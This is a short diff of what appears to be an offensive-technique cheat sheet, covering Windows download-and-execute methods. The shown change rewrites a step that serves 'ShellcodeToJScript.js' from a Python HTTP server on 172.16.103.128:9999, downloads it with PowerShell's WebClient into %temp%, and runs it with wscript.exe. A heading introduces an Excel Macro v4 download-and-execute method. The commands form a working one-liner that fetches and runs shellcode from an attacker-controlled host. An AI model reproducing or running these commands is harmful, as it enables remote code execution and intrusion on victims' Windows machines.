@@ -91,8 +91,8 @@ PS>wscript.exe x.js
 ```
 # python3 -m http.server 9999
 
-PS>powershell -c "(New-Object System.Net.WebClient).DownloadString('http://172.16.103.128:9999/ShellcodeToJScript.js')" > x.js
-PS>wscript.exe x.js
+>powershell -c "(New-Object System.Net.WebClient).DownloadString('http://172.16.103.128:9999/ShellcodeToJScript.js')" > %temp%\x.js
+>wscript.exe %temp%\x.js
 ```
 
 7. Excel download and execute (Macro v4)
